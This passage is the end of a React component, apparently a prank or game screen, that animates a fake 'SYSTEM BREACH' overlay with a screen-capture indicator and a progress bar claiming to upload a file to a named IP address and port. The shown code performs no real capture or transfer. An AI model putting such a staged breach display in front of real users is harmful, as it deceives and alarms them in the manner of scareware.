                        borderRight: corner.includes("right")
                          ? "3px solid #00FF46"
                          : "none",
                      }}
                    />
                  ),
                )}
                {/* REC indicator */}
                <motion.div
                  animate={{ opacity: [1, 0, 1] }}
                  transition={{
                    repeat: Number.POSITIVE_INFINITY,
                    duration: 0.8,
                  }}
                  style={{
                    position: "absolute",
                    top: 20,
                    right: 20,
                    color: "#FF3333",
                    fontSize: 14,
                    fontWeight: "bold",
                    display: "flex",
                    alignItems: "center",
                    gap: 6,
                  }}
                >
                  <span
                    style={{
                      width: 10,
                      height: 10,
                      borderRadius: "50%",
                      background: "#FF3333",
                      display: "inline-block",
                    }}
                  />
                  REC
                </motion.div>
                {/* Capturing text */}
                <motion.div
                  animate={{ opacity: [1, 0.4, 1] }}
                  transition={{ repeat: Number.POSITIVE_INFINITY, duration: 1 }}
                  style={{
                    position: "absolute",
                    top: 20,
                    left: "50%",
                    transform: "translateX(-50%)",
                    color: "#00FF46",
                    fontSize: 16,
                    fontWeight: "bold",
                    letterSpacing: 3,
                  }}
                >
                  ● CAPTURING SCREEN...
                </motion.div>
              </>
            )}
            {screenshotPhase === "upload" && (
              <motion.div
                initial={{ scale: 0.8, opacity: 0 }}
                animate={{ scale: 1, opacity: 1 }}
                transition={{ duration: 0.3 }}
                style={{
                  position: "relative",
                  background: "rgba(0,0,0,0.92)",
                  border: "2px solid #00FF46",
                  borderRadius: 4,
                  padding: "32px 40px",
                  width: 440,
                  maxWidth: "90vw",
                  textAlign: "center",
                  boxShadow: "0 0 40px rgba(0,255,70,0.3)",
                }}
              >
                <div
                  style={{
                    color: "#FF3333",
                    fontSize: 13,
                    letterSpacing: 3,
                    marginBottom: 8,
                  }}
                >
                  ⚠ SYSTEM BREACH
                </div>
                <div
                  style={{
                    color: "#00FF46",
                    fontSize: 18,
                    fontWeight: "bold",
                    letterSpacing: 2,
                    marginBottom: 4,
                  }}
                >
                  UPLOADING TO SERVER
                </div>
                <div
                  style={{
                    color: "#0af",
                    fontSize: 14,
                    marginBottom: 24,
                    fontFamily: "monospace",
                  }}
                >
                  185.220.101.47:8443
                </div>
                {/* Progress bar */}
                <div
                  style={{
                    background: "#111",
                    border: "1px solid #333",
                    borderRadius: 2,
                    height: 12,
                    marginBottom: 12,
                    overflow: "hidden",
                  }}
                >
                  <motion.div
                    style={{
                      height: "100%",
                      background: "linear-gradient(90deg, #00FF46, #0af)",
                      borderRadius: 2,
                    }}
                    animate={{ width: `${uploadProgress}%` }}
                    transition={{ duration: 0.05 }}
                  />
                </div>
                <div
                  style={{
                    color: "#aaa",
                    fontSize: 12,
                    marginBottom: 16,
                    display: "flex",
                    justifyContent: "space-between",
                  }}
                >
                  <span>{uploadProgress}%</span>
                  <span>{(uploadBytes / 1024).toFixed(1)} KB / 1,228.8 KB</span>
                </div>
                {uploadProgress < 100 ? (
                  <motion.div
                    animate={{ opacity: [1, 0.4, 1] }}
                    transition={{
                      repeat: Number.POSITIVE_INFINITY,
                      duration: 0.6,
                    }}
                    style={{ color: "#00FF46", fontSize: 13, letterSpacing: 2 }}
                  >
                    TRANSFERRING DATA...
                  </motion.div>
                ) : (
                  <motion.div
                    initial={{ opacity: 0, scale: 0.8 }}
                    animate={{ opacity: 1, scale: 1 }}
                    style={{
                      color: "#00FF46",
                      fontSize: 14,
                      fontWeight: "bold",
                      letterSpacing: 2,
                    }}
                  >
                    ✓ TRANSFER COMPLETE — 1 file sent
                  </motion.div>
                )}
              </motion.div>
            )}
          </motion.div>
        )}
      </AnimatePresence>

      <div style={{ display: "none" }}>
        © {new Date().getFullYear()}. Built with love using{" "}
        <a
          href={`https://caffeine.ai?utm_source=caffeine-footer&utm_medium=referral&utm_content=${encodeURIComponent(window.location.hostname)}`}
        >
          caffeine.ai
        </a>
      </div>
    </div>
  );
}
